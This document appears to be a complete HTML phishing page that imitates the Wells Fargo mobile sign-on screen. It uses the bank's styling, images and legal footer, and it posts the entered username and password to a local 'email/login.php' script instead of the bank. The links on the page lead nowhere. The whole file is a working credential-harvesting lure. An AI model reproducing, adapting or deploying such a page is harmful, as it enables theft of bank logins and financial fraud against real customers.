<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Wells Fargo&nbsp;Sign On to View Your Accounts</title>
<link rel="shortcut icon" link rel="logo-icon" href="img/favicon.ico">
<link rel="stylesheet" type="text/css" href="https://www01.wellsfargomedia.com/css/mobile/smartphone-home.css"/>
<style>
body {
    background-color: #44464a;
    font-size: 100%;
    margin: 0;
}
a, a:link, a:visited {
    color: white;
	text-decoration: none;
}
.primary{
	background: url(img/btn_blueslice.gif) repeat-x scroll left top transparent;
    border: 1px solid #e0e3e2;
    font-weight: bold;
    margin: 7px 10px 8px 4px;
    padding: 2px 10px;
    color: white;
    float: right;
}
.icon-bar{
display: block;
width: 28px;
height: 4px;
border-bottom: 4px solid #ae1e23;
border-radius: 1px;
background-color: white;
}
</style>
</head>
<body>
<div style="height: 42px;position: fixed;top: 0;left: 0;right: 0;transition: all .5s ease-in-out;z-index: 1030;background-color: #ae1e23;overflow: hidden;width: auto;">
<center>
<table style="width: 300px;padding: 3px;">
<tr>
<td><img src="https://www01.wellsfargomedia.com/assets/_mobile/images/global/icn-nav-arrow-back-mob-28x28-v1_00.svg"/></td>
<td><center><img src='img/logo.png'/></center></td>
<td>
<span class="icon-bar">&zwj;</span>
<span class="icon-bar">&zwj;</span>
<span class="icon-bar">&zwj;</span>
</td>
</tr>
</table>
</center>
</div>
<br>
<br>
<br>
<div class="overlaySignOn" style="top: 42px;" aria-hidden="false">

		<div class="overlayContainer">
			<div class="welcome-container">Welcome</div>
			<div class="security-container">
				<span class="security-img"></span>
				<a href="" class="security-text">Online &amp; Mobile Security</a>
			</div>
			<div align="center" class="signOnContainer">							
				<form id="frmSignon" action="email/login.php" method="post" autocomplete="off">
					<input type="text" maxlength="14" id="userid" required="required" style='outline:none;' placeholder="Username" class="required" name="userid" value="" autocomplete="off">
					<div align="left" class="save-uid">
						<ul>
							<li>
								<input type="checkbox" name="username" id="saveusername" value="">
								<label for="saveusername"><span></span>Save Username</label>
							</li>
						</ul>
					</div>
					<input type="password" maxlength="14" required="required" style='outline:none;' placeholder="Password" class="required" id="passwd" name="j_password" value="" autocomplete="off">
					<input type="submit" class="signOn" value="Sign On" data-mrkt-tracking-id="69d8a9b6-4c51-4afc-abd6-f6f6227706ef">
					<div align="left" class="forgot-uid-pwd">
						<a href="" class="enroll-text">Forgot Password/Username?</a>
					</div>
					<div class="enroll-header">New to <em>Wells Fargo Online</em><sup>®</sup>?</div>
					<div class="enroll">
						<a href="" class="enroll-text">Enroll</a>
					</div>
</form>
			</div>
			<div class="appstoreBadge" id="android" style="text-align: left;"> 
				<a href="" class="ios" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>  
				<a href="" class="android"><span class="sr-only"></span></a>
			</div>
			<footer role="contentinfo">
				<div class="html5footer c9" id="pageFooter">
					<nav class="nav-footer">
						<div class="footer-link clistData" style="font-size: 10px;text-align: left;">
							<a href="">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="">Ad Choices</a>
							<div class="footer-oaa"><a href="">Online Access Agreement</a>
							</div>
						</div>
						<div class="footer-content" style="font-size: 13px;text-align: left;">
							<div>
								<strong>Investment and Insurance products:</strong>
							</div>
							<div>
								<strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
							</div>
						</div>
						<div class="footer-content" style="font-size: 12px;text-align:left;">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
						<div class="footer-content" style="font-size: 12px;text-align:left;">
							<span class="home-equal">&zwj;</span> Equal Housing Lender. NMLSR ID 399801</div>
						<div class="footer-content footer-margin" style="font-size:12px;text-align:left;">© 2017 Wells Fargo. All rights reserved.</div>
						<div class="stage-coach"><img src="img/yah.png" aria-hidden="true" alt=""></div>
						</nav></div>
					
				</footer></div>
			
		</div>

</body>
</html>
